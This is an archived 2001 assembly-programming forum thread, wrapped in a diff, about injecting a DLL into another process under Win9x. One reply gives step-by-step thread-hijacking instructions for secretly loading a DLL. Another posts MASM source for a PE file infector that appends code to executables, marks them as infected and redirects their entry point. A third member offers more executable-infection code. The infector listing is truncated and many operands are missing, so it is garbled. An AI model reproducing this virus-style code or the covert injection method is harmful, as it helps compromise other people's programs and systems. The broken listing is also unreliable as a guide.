@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <meta charset="utf-8" />
+  <title>Injecting a DLL into other process''s addr. space - Forums - ASM Community</title>
+  <link rel="stylesheet" type="text/css" href="../../../style.css" />
+  <link rel="canonical" href="../?id=28366" />
+     </head>
+ <body>
+  <div id="header">
+   <h1><a href="../../../">ASM Community</a></h1>
+  </div>
+  <div id="content">
+   <p class="breadcrumbs"><a href="../../../">Home</a> &raquo; <a href="../../">Forums</a> &raquo; <a href="../../board/?id=3">MAIN</a> &raquo; <a href="../?id=28366">Injecting a DLL into other process''s addr. space</a></p>
+   <div class="post" id="post-200763">
+    <div class="subject"><a href="#post-200763">Injecting a DLL into other process''s addr. space</a></div>
+    <div class="body">How can I inject my DLL into address space of another process? I know how to do it with hooks, but that's not all that I need. I'm writing the API controlling program. The method with hooks doesn't get all the processes (when any process doesn't have windows or it is console program, with WINOLDAP only)
+ <strong>I need the code, which could inject a DLL into address space for a given process handle under Win9x</strong>
+
+This message was edited by CHEMI$T, on 6/11/2001 9:49:04 PM</div>
+    <div class="meta">Posted on 2001-06-11 21:45:00 by CHEMI$T</div>
+   </div>
+   <div class="post" id="post-200764">
+    <div class="subject"><a href="#post-200764">Injecting a DLL into other process''s addr. space</a></div>
+    <div class="body">Inserting a DLL into another processes address space isn't going to achieve anything, unless you are overwriting the code of a previous DLL, in which case it's probably better to re-jig that DLL.
+
+Of course, if you don't have access to the source for the program, then overwriting the code from it, it a particulary dangerous thing to do... still....
+
+The functions you need are ones like VirtualProtect. I think there has been a discussion on this already here, have a search on the board.
+
+umbongo</div>
+    <div class="meta">Posted on 2001-06-12 06:39:00 by umbongo</div>
+   </div>
+   <div class="post" id="post-200765">
+    <div class="subject"><a href="#post-200765">Injecting a DLL into other process''s addr. space</a></div>
+    <div class="body">It can be done and I have done it in my IczDump utility. The trick here is to "hypnotize" the target process to call LoadLibrary. The steps involved may be a little convoluted but below is the summarization:
+1. Suspend the main thread of the target process then call GetThreadContext to obtain the values of various registers, including eip.
+2. prepare the code that you will inject into the target process. This also includes fixing the relative/absolute addresses of jumps/calls in that code snippet. Of course, not every program imports LoadLibrary function but under win9x, the addresses of functions in system DLLs are always the same in all processes so you can call GetProcAddress to obtain the address of LoadLibrary in your program and hardcode that value into the code snippet
+3. Calculate the size of the code snippet and find out the address where you will apply the patch. I choose the entrypoint address but it can be any arbitrary address so long as it's executable.
+4. Save the original code in the target process that you will replace with your own LoadLibrary snippet so you can restore it later
+5. Overwrite the code with your own snippet
+6. Modify the value of EIP in the CONTEXT structure to point to the address of your snippet in the target process then call SetThreadContext
+7. Resume the main thread of the target
+8. The target will call LoadLibrary to load the DLL.
+9. When LoadLibrary returns, in your own snippet, it will notify your program and then go into an infinite loop. I use Event object for this purpose.
+10. When your program is notified, it suspends the main thread again, restores the code and then restores the values in CONTEXT structure and then calls SetThreadContext again.
+11. The result is that, the target process loads the DLL without knowing it did so.</div>
+    <div class="meta">Posted on 2001-06-12 06:54:00 by Iczelion</div>
+   </div>
+   <div class="post" id="post-200766">
+    <div class="subject"><a href="#post-200766">Injecting a DLL into other process''s addr. space</a></div>
+    <div class="body">Iczelion, 
+are sources of IczDump available? If so where I can download them?</div>
+    <div class="meta">Posted on 2001-06-12 07:31:00 by vkim</div>
+   </div>
+   <div class="post" id="post-200767">
+    <div class="subject"><a href="#post-200767">Injecting a DLL into other process''s addr. space</a></div>
+    <div class="body">It's currently not available</div>
+    <div class="meta">Posted on 2001-06-14 06:27:00 by Iczelion</div>
+   </div>
+   <div class="post" id="post-200768">
+    <div class="subject"><a href="#post-200768">Injecting a DLL into other process''s addr. space</a></div>
+    <div class="body">Check out this article by Jeffrey Richter:
+
+"Load Your 32-bit DLL into Another Process's Address Space Using INJLIB," MSJ May 1994.
+
+I never tried it, but a little birdy told me it's relevant to your needs.   ;-)</div>
+    <div class="meta">Posted on 2001-06-14 07:23:00 by Ernie</div>
+   </div>
+   <div class="post" id="post-200769">
+    <div class="subject"><a href="#post-200769">Injecting a DLL into other process''s addr. space</a></div>
+    <div class="body">don't know if it possible via mempatch, too
+my prog below opens a pe file (mapping!)
+it increases the last sections and adds 
+alignment and infection-mark stuff then it
+writes all data from label @start to @end_infection
+to the file and changes the entry point.
+
+if the infected file is run my prog gets kernel
+gets getmodulehandle gets getprocaddress and
+last but not least gets loadlibrary. it calls
+loadlibrary and <strong>INJECTS</strong> "user32.dll" in the
+modules address space (try a pe with no imports!)
+then it calls a little messagebox and pops
+control back to the host.
+
+have fun but don't change this code to do
+malicious thing :)
+
+<pre><code>
+.486    
+.model      flat, stdcall
+option      casemap:none
+include     \masm32\include\windows.inc
+include     \masm32\include\kernel32.inc
+include     \masm32\include\user32.inc
+includelib  \masm32\lib\user32.lib
+includelib  \masm32\lib\kernel32.lib
+
+.DATA
+            filename        db "test.exe",0
+.DATA?
+            fHandle         dd ?
+            MapOfs          dd ?
+            FileSize        dd ?
+            Memory          dd ?
+            mHandle         dd ?
+            virlen          dd ?            
+            
+.CODE                                 
+start:      
+        mov     eax,offset @end_infection
+        sub     eax,offset @start
+        mov     virlen,eax
+            
+;++++++ open File
+        invoke  CreateFile,addr filename,GENERIC_READ+GENERIC_WRITE,
+                FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
+        cmp     eax,-1
+        jz      closef
+        mov     fHandle,eax
+
+        invoke  GetFileSize,fHandle,NULL
+        mov     FileSize, eax          
+        add     eax,virlen
+        add     eax,1000
+        mov     Memory,eax
+
+        invoke  CreateFileMapping,fHandle,NULL,PAGE_READWRITE,0,eax,NULL
+        mov     mHandle,eax
+                                   
+        invoke  MapViewOfFile,eax,FILE_MAP_WRITE,0,0,Memory
+        mov     MapOfs,eax            
+        mov     edx, eax
+        push    edx
+
+;++++++ check 'MZ' and 'PE' / EDX=IFH / ESI=IOH
+        cmp     word ptr ,'ZM'             
+        jnz     closef
+
+        add     edx,dword ptr          
+
+        cmp     word ptr ,'EP'             
+        jnz     closef
+
+        cmp     dword ptr ,'KCUF' 
+        jz      closef                       
+
+;++++++ retrive LastSection / EBX=LAST SECTION
+        mov     ebx, dword ptr 
+        shl     ebx,3
+        xor     eax,eax
+        mov     ax, word ptr 
+        dec     eax
+        mov     ecx,28h
+        push    edx
+        mul     ecx
+        pop     edx
+        add     ebx,edx
+        add     ebx,eax
+        add     ebx,78h
+
+;++++++ set new VirtualSize (OldValue + VirusLenght)
+        mov     eax,virlen
+        xadd    dword ptr ,eax          
+        push    eax                             
+
+        add     eax,virlen                      
+        push    dword ptr              
+
+;++++++ set new SizeOfRawData (NewVirtualSize / FileAlignment + 1 * FilAlignment)
+        push    edx                             
+        mov     ecx,dword ptr          
+        xor     edx,edx                         
+        div     ecx                             
+        xor     edx,edx
+        inc     eax                             
+        mul     ecx                             
+        mov     dword ptr ,eax         
+        pop     edx                             
+
+;++++++ set new SizeOfImage (SizeOfImage + NewSizeOfRawData - OldSizeOfRawData)
+        pop     ecx                             
+        sub     eax,ecx                         
+        add     dword ptr ,eax         
+
+;++++++ set new EntryPoint (OldVirtualSize + VirtualAddress) / save oldEP + ImageBase
+        pop     eax                             
+        add     eax,dword ptr          
+        xchg    dword ptr ,eax         
+
+        mov</div>
+    <div class="meta">Posted on 2001-06-14 16:25:00 by _drcmda</div>
+   </div>
+   <div class="post" id="post-200770">
+    <div class="subject"><a href="#post-200770">Injecting a DLL into other process''s addr. space</a></div>
+    <div class="body"><strong>AAAARRRRGHHH i forget to mention: link this file's code section (.text) as CERW(CODE/EXECUTE/READ?/WRITE)</strong></div>
+    <div class="meta">Posted on 2001-06-14 16:30:00 by _drcmda</div>
+   </div>
+   <div class="post" id="post-200771">
+    <div class="subject"><a href="#post-200771">Injecting a DLL into other process''s addr. space</a></div>
+    <div class="body">Couldn't you use VirtualAlloc, CreateRemoteThread then LoadLibrary like BO does ?
+There was a thread on this board about this subject but i didn't get the search function to work.</div>
+    <div class="meta">Posted on 2001-06-14 18:18:00 by BJZ</div>
+   </div>
+   <div class="post" id="post-200772">
+    <div class="subject"><a href="#post-200772">Injecting a DLL into other process''s addr. space</a></div>
+    <div class="body">Iczelion, is this program oriented onto WinNT? I need a code for Win9x. I already can make it in NT, I can't make it in windows, because I can't get Thread handle to operate with. In Win2k there is OpenThread(like OpenProcess), but it's not realized in Win9x.
+ What can I do?
+
+P.S. I had a lot of work to do, so didna answer for a long time... Excuse me...</div>
+    <div class="meta">Posted on 2001-07-05 02:42:00 by CHEMI$T</div>
+   </div>
+   <div class="post" id="post-200773">
+    <div class="subject"><a href="#post-200773">Injecting a DLL into other process''s addr. space</a></div>
+    <div class="body">chemi$t,
+
+i have exactly the same problem. under nt, i can use VirtualAllocEx() and CreateRemoteThread(), but there's no equivalent for w9x, so i am using a scheme similar to the one iczelion seens to used in iczdump...
+
+i hope you dont get these same problems, but maybe help know the ones i have: after overwriting the mz/pe header in the another process, and setting the EIP in the context, the new code dont run. i tried change the priority of the thread, and its suspended/resume state, but without success. seens some system processes are frozen, and this affect its thread...
+
+anybody know how i can make these processes run for a while, then restore their state? currently, i am studying the PROCESS_DATABASE and other structures residing in fs:0+ but i hope there's a clearer way to do this
+
+Vecna
+
+ps: iczelion,hutch,ernie: is ok to post code to infect executables here? i was told that no, but, if is allowed, as seens, i have really good code for this, and i want to share it.
+
+This message was edited by vecna, on 7/5/2001 12:47:54 PM</div>
+    <div class="meta">Posted on 2001-07-05 12:45:00 by vecna</div>
+   </div>
+   <div class="post" id="post-200774">
+    <div class="subject"><a href="#post-200774">Injecting a DLL into other process''s addr. space</a></div>
+    <div class="body">Hi CHEMI$T,
+
+did you find a proper solution for Win9x for your problem by now? Without modifying PE files? I would be interested to hear about.
+
+japheth</div>
+    <div class="meta">Posted on 2001-07-06 13:48:00 by japheth</div>
+   </div>
+   <div class="post" id="post-200775">
+    <div class="subject"><a href="#post-200775">Injecting a DLL into other process''s addr. space</a></div>
+    <div class="body">Hi All!
+
+<strong>vecna</strong>: could you please mail me that code? It''s very interesting. Pavel Dovgalenko
+
+<strong>japheth</strong>: For now I''ve just translated function from Jeffry Righter''s book to modify IAT table for a process to set your own function instead of API used by a process. But it works only with your own process. I could post it here, if someone needs it.</div>
+    <div class="meta">Posted on 2001-07-06 23:51:00 by CHEMI$T</div>
+   </div>
+  </div>
+ </body>
+</html>
